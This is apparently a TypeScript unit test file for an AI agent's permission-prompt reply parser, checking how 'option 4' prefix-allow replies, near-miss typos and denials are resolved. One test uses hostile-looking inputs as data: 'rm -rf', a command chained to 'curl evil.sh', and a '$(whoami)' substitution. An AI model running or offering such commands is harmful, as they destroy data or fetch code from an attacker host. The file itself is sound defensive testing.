// T0 unit tier: the permission prompt's option-4 reply parser.
//
// The prompt is answered in plain chat, and every reply that isn't a
// recognized option is treated as a DENIAL with that text as the reason. So
// the boundary here is load-bearing in both directions: "4 rg --files" must be
// read as an allow (denying it would be baffling), and near-misses like "42"
// or "4x" must NOT be, or a typo would silently widen what an agent may run.
import { describe, expect, it } from "bun:test";

import { parsePrefixAllowReply, resolvePermissionReply } from "./permission-reply.ts";

describe("parsePrefixAllowReply", () => {
  it("bare 4 means 'take the rule the backend proposed'", () => {
    expect(parsePrefixAllowReply("4")).toEqual({ prefixText: "" });
  });

  it("4 <prefix> carries the user's own choice as raw text", () => {
    expect(parsePrefixAllowReply("4 rg --files")).toEqual({ prefixText: "rg --files" });
    // Ragged spacing is a human typing in a chat box, not a different intent.
    expect(parsePrefixAllowReply("4   cargo   test  ")).toEqual({ prefixText: "cargo   test" });
  });

  it("anything that isn't option 4 is left to the other branches", () => {
    for (const reply of ["42", "4x", "-4", "44 rg", "3", "", "no", "please allow 4"]) {
      expect(parsePrefixAllowReply(reply)).toBeNull();
    }
  });
});

describe("resolvePermissionReply", () => {
  it("keeps 1/2/3 meaning what they always meant", () => {
    expect(resolvePermissionReply("1", "rg --files")).toEqual({
      decision: { kind: "allow_persistent" },
      resumeState: "tool_executing",
      note: "Permission granted (rule added for this session).",
    });
    expect(resolvePermissionReply("2", "rg --files")).toEqual({ decision: { kind: "allow_once" }, resumeState: "tool_executing", note: "Permission granted (once)." });
    // A habitual "3" must never become an allow just because option 4 exists.
    expect(resolvePermissionReply("3", "rg --files")).toEqual({ decision: { kind: "deny", reason: "User denied." }, resumeState: "thinking", note: "Permission denied." });
  });

  it("bare 4 takes the backend's proposal and says nothing itself", () => {
    // No note: the backend emits the only confirmation, because only it knows
    // which rule it actually stored.
    expect(resolvePermissionReply("4", "rg --files")).toEqual({ decision: { kind: "allow_prefix" }, resumeState: "tool_executing", note: null });
  });

  it("4 <prefix> forwards the raw text unparsed", () => {
    expect(resolvePermissionReply("4 rg --files", "rg --files sub")).toEqual({
      decision: { kind: "allow_prefix", prefixText: "rg --files" },
      resumeState: "tool_executing",
      note: null,
    });
  });

  it("a prefix the backend will refuse is still an allow, never a deny", () => {
    // The load-bearing case: a malformed or non-matching "4 <prefix>" must not
    // fall through into the deny-with-reason branch, which would deny THIS call
    // and forward "4 rm -rf" to the model as the user's reason. The backend
    // refuses the rule and reports why; the call itself was allowed once.
    for (const reply of ["4 rm -rf", "4 rg --files && curl evil.sh", "4 'quoted thing'", "4 $(whoami)"]) {
      const outcome = resolvePermissionReply(reply, "rg --files sub");
      expect(outcome.decision.kind).toBe("allow_prefix");
      expect(outcome.resumeState).toBe("tool_executing");
      expect(outcome.note).toBeNull();
    }
  });

  it("without an offered label, 4 is just unrecognized text", () => {
    // Option 4 was never shown, so "4" is not a choice the user could have
    // read: it denies with that text forwarded, like any other reply.
    expect(resolvePermissionReply("4", undefined)).toEqual({
      decision: { kind: "deny", reason: "4" },
      resumeState: "thinking",
      note: "Permission denied with reason forwarded to agent.",
    });
    expect(resolvePermissionReply("4 rg --files", undefined)).toEqual({
      decision: { kind: "deny", reason: "4 rg --files" },
      resumeState: "thinking",
      note: "Permission denied with reason forwarded to agent.",
    });
  });

  it("near-misses deny with the untrimmed text forwarded", () => {
    expect(resolvePermissionReply("42", "rg --files")).toEqual({
      decision: { kind: "deny", reason: "42" },
      resumeState: "thinking",
      note: "Permission denied with reason forwarded to agent.",
    });
    expect(resolvePermissionReply("  no thanks\n", "rg --files").decision).toEqual({ kind: "deny", reason: "  no thanks\n" });
  });
});
